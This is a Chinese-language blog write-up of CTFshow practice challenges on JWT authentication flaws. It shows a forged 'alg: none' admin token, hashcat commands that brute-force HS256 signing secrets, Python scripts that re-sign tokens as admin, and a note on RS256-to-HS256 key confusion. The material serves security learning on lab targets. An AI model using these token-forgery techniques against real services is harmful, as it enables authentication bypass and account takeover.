@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web345复现失败，题目改过了，&amp;#123;&quot;sub&quot;:&quot;admin&quot;&amp;#125; 也不好使，外面还多了一层中括号。。。     web34612345678910111213141516171819202122232425262728293031323334353637383940$ python .\jwt_tool.py &amp;#x27;eyJhbGci">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Practice - CTFSHOW WEB入门 JWT篇">
+<meta property="og:url" content="https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="web345复现失败，题目改过了，&amp;#123;&quot;sub&quot;:&quot;admin&quot;&amp;#125; 也不好使，外面还多了一层中括号。。。     web34612345678910111213141516171819202122232425262728293031323334353637383940$ python .\jwt_tool.py &amp;#x27;eyJhbGci">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-10T02:18:04.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.363Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Practice">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Practice - CTFSHOW WEB入门 JWT篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/10/ctfshow-web-getting-started-ssrf/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/09/ctfshow-web-getting-started-nodejs/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&text=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&is_video=false&description=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 JWT篇&body=Check out this article: https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&title=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&name=Practice - CTFSHOW WEB入门 JWT篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-jwt/&t=Practice - CTFSHOW WEB入门 JWT篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web345"><span class="toc-number">1.</span> <span class="toc-text">web345</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web346"><span class="toc-number">2.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web347"><span class="toc-number">3.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web348"><span class="toc-number">4.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web349"><span class="toc-number">5.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web350"><span class="toc-number">6.</span> <span class="toc-text">web350</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Practice - CTFSHOW WEB入门 JWT篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-10T02:18:04.000Z" itemprop="datePublished">2022-06-10</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.363Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>复现失败，题目改过了，<code>&#123;&quot;sub&quot;:&quot;admin&quot;&#125;</code> 也不好使，外面还多了一层中括号。。。    </p>
+<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ python .\jwt_tool.py &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg0MTc5NiwiZXhwIjoxNjU0ODQ4OTk2LCJuYmYiOjE2NTQ4NDE3OTYsInN1YiI6InVzZXIiLCJqdGkiOiJiZWIyNDgxZDA1MzZhZjUxMjBlN2UxNzdmNDU5ZjU4YSJ9.MbQ4es2RnGnDMlzC8kGhUjV2dwEcPEO58Pf_WjYoxtU&#x27;</span><br><span class="line"></span><br><span class="line">        \   \        \         \          \                    \</span><br><span class="line">   \__   |   |  \     |\__    __| \__    __|                    |</span><br><span class="line">         |   |   \    |      |          |       \         \     |</span><br><span class="line">         |        \   |      |          |    __  \     __  \    |</span><br><span class="line">  \      |      _     |      |          |   |     |   |     |   |</span><br><span class="line">   |     |     / \    |      |          |   |     |   |     |   |</span><br><span class="line">\        |    /   \   |      |          |\        |\        |   |</span><br><span class="line"> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|</span><br><span class="line"> Version 2.0.2                \______|             @ticarpi</span><br><span class="line"></span><br><span class="line">Original JWT:</span><br><span class="line"></span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] alg = &quot;HS256&quot;</span><br><span class="line">[+] typ = &quot;JWT&quot;</span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] iss = &quot;admin&quot;</span><br><span class="line">[+] iat = 1654841796    ==&gt; TIMESTAMP = 2022-06-10 14:16:36 (UTC)</span><br><span class="line">[+] exp = 1654848996    ==&gt; TIMESTAMP = 2022-06-10 16:16:36 (UTC)</span><br><span class="line">[+] nbf = 1654841796    ==&gt; TIMESTAMP = 2022-06-10 14:16:36 (UTC)</span><br><span class="line">[+] sub = &quot;user&quot;</span><br><span class="line">[+] jti = &quot;beb2481d0536af5120e7e177f459f58a&quot;</span><br><span class="line"></span><br><span class="line">Seen timestamps:</span><br><span class="line">[*] iat was seen</span><br><span class="line">[*] exp is later than iat by: 0 days, 2 hours, 0 mins</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
+<p>尝试 none 攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span><br><span class="line"><span class="comment"># &#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1654841796,&quot;exp&quot;:1654848996,&quot;nbf&quot;:1654841796,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;beb2481d0536af5120e7e177f459f58a&quot;&#125;</span></span><br><span class="line">eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg0MTc5NiwiZXhwIjoxNjU0ODQ4OTk2LCJuYmYiOjE2NTQ4NDE3OTYsInN1YiI6ImFkbWluIiwianRpIjoiYmViMjQ4MWQwNTM2YWY1MTIwZTdlMTc3ZjQ1OWY1OGEifQ</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg0MTc5NiwiZXhwIjoxNjU0ODQ4OTk2LCJuYmYiOjE2NTQ4NDE3OTYsInN1YiI6ImFkbWluIiwianRpIjoiYmViMjQ4MWQwNTM2YWY1MTIwZTdlMTc3ZjQ1OWY1OGEifQ.</span><br></pre></td></tr></table></figure>
+<p>别忘了结尾的 <code>.</code></p>
+<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>这次改成 none 不行了，hashcat 爆破 secret:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .\hashcat.exe -m 16500 I:\test\ctfshow\web347\jwt.txt -a 3 -w 3 ?d?d?d?d?d?d</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg0MzA1MiwiZXhwIjoxNjU0ODUwMjUyLCJuYmYiOjE2NTQ4NDMwNTIsInN1YiI                                                                                                           I6InVzZXIiLCJqdGkiOiJjOGUxODFkNjI1NmU3NGNlNDQ4OWMxZmFiMTM0ZmY3NyJ9.Q5ZvANDXJ5uGUmS7HuxzUqBdNy_QO0gUDQHCPqapqr8:123456</span><br></pre></td></tr></table></figure>
+<p>于是  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_origin = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg0NjgxNywiZXhwIjoxNjU0ODU0MDE3LCJuYmYiOjE2NTQ4NDY4MTcsInN1YiI6InVzZXIiLCJqdGkiOiI3YjIxMzNiZWQ5OWRjMGQ1MTM3N2YxNDFhYWQyZmVjOSJ9.Gnhw24pqJOTZ23ncvSzJuHHPgys2F2ISCf4_kGmiRtA&quot;</span></span><br><span class="line">secret = <span class="string">&quot;123456&quot;</span></span><br><span class="line">alg = json.loads(base64.b64decode(jwt_origin.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]))[<span class="string">&quot;alg&quot;</span>]</span><br><span class="line">payload = jwt.decode(jwt_origin, secret, algorithms=alg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;before: &quot;</span>, payload)</span><br><span class="line">payload[<span class="string">&quot;sub&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;after: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">jwt_payload = jwt.encode(payload, secret, algorithm=alg)</span><br><span class="line"><span class="built_in">print</span>(jwt_payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>提示和上题一样，hashcat 爆破  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 16500 I:\test\ctfshow\web348\jwt.txt -a 3 -w 3 ?b?b?b?b</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg1MzIwNywiZXhwIjoxNjU0ODYwNDA3LCJuYmYiOjE2NTQ4NTMyMDcsInN1YiI                                                                                                           I6InVzZXIiLCJqdGkiOiI3ZGYzZDRmMjIyYTBmMjk5OWI0MTYwNTZjNGUxNzEyOCJ9.6VABqSwnJJhNNF4fH_VrNjqxpsFZvNV_O0YjfzxxO3s:aaab</span><br></pre></td></tr></table></figure>
+<p>于是</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_origin = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NDg1MzIwNywiZXhwIjoxNjU0ODYwNDA3LCJuYmYiOjE2NTQ4NTMyMDcsInN1YiI6InVzZXIiLCJqdGkiOiI3ZGYzZDRmMjIyYTBmMjk5OWI0MTYwNTZjNGUxNzEyOCJ9.6VABqSwnJJhNNF4fH_VrNjqxpsFZvNV_O0YjfzxxO3s&quot;</span></span><br><span class="line">secret = <span class="string">&quot;aaab&quot;</span></span><br><span class="line">alg = json.loads(base64.b64decode(jwt_origin.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]))[<span class="string">&quot;alg&quot;</span>]</span><br><span class="line">payload = jwt.decode(jwt_origin, secret, algorithms=alg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;before: &quot;</span>, payload)</span><br><span class="line">payload[<span class="string">&quot;sub&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;after: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">jwt_payload = jwt.encode(payload, secret, algorithm=alg)</span><br><span class="line"><span class="built_in">print</span>(jwt_payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>私钥公钥都放 /public。。。 彳亍<br>这里用 jwt.decode RS256 遇到了坑，是这样解决的 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/65987293/typeerror-load-pem-private-key-missing-1-required-positional-argument-backe">https://stackoverflow.com/questions/65987293/typeerror-load-pem-private-key-missing-1-required-positional-argument-backe</a>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_origin = <span class="string">&quot;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTY1NDg1NDAyM30.LoQYsGNplceMfmHPkysbc6ZTdNdpWOxuUpBu1IiyW_CUafDDEIyCxsJjjrOpo7RftkLC6O_kVd95R_E8SLzS7OTtUX-rYE3Z4XRFab-z8mgrPF2x_aE8Cb48WB-TNCrzseUCjcixO55PTN4aJc8S9hQpaZN6ita9QVAWGs_YQsY&quot;</span></span><br><span class="line"><span class="comment"># secret = &quot;aaab&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.key&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;public.key&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public_key = f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alg = json.loads(base64.b64decode(jwt_origin.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]))[<span class="string">&quot;alg&quot;</span>]</span><br><span class="line">payload = jwt.decode(jwt_origin, public_key, algorithms=alg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;before: &quot;</span>, payload)</span><br><span class="line">payload[<span class="string">&quot;user&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;after: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">jwt_payload = jwt.encode(payload, private_key, algorithm=alg)</span><br><span class="line"><span class="built_in">print</span>(jwt_payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert,<span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>+err);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<p>RS256 =&gt; HS256，对称加密公钥当密码，python 写总报错绕过了生成的也不能用，找了个 js 脚本  </p>
